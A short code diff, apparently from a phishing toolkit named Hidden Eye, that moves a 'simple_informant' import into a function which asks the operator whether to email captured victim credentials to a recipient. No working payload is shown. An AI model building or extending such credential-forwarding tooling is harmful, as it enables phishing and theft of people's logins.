@@ -13,7 +13,6 @@ default_palette = theme.default_palette
 
 def captured_data_email_prompt():
     run_command('clear')
-    import Defs.ActionManager.simple_informant as simple_informant
     print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
@@ -37,6 +36,7 @@ def captured_data_email_prompt():
         captured_data_email_prompt()
 
 def captured_data_email_confirmation(port):  # Ask user to start sending credentials to recipient Email Address.
+    import Defs.ActionManager.simple_informant as simple_informant
     choice = input(
         "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
     if choice == 'Y' or choice == 'y':
